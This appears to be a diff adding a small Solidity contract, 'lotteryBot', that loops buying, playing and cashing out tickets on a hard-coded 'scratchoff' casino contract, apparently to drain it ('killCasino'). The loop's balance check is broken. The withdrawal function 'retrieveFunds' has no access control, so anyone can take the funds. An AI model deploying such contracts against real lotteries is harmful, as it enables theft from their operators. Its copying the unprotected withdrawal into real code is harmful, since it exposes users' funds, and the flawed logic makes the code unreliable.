@@ -1,0 +1,55 @@
+//SPDX-License-Identifier: Unlicense
+pragma solidity ^0.8.0;
+
+contract lotteryBot {
+
+    address owner;
+    address payable casino;
+    scratchoff t;
+
+    constructor(){
+        owner = msg.sender;
+        casino = payable(0x1482717Eb2eA8Ecd81d2d8C403CaCF87AcF04927);
+        t = scratchoff(casino);
+    }
+
+    receive() external payable{}
+
+    function fundBot() public payable{
+    }
+
+    function getTicket() public {
+        require(address(this).balance >= 2 ether, "not enough in the contract");
+        t.buyTicket{value: 2 ether}();
+    }
+
+    function playLottery() public {
+        t.play(2);
+    }
+
+        function reFinance() public payable {
+        t.takePayout();
+    }
+
+    function killCasino() public {
+        while(address(this).balance < 10) {
+            getTicket();
+            playLottery();
+            reFinance();
+        }
+    }
+
+    function retrieveFunds() public {
+        (bool success,) = owner.call{value: address(this).balance}("");
+        require(success, "Not paid");
+    }
+
+
+}
+
+abstract contract scratchoff {
+    function buyTicket() public payable virtual;
+    function play(uint num) public virtual;
+    function takePayout() public virtual;
+
+}
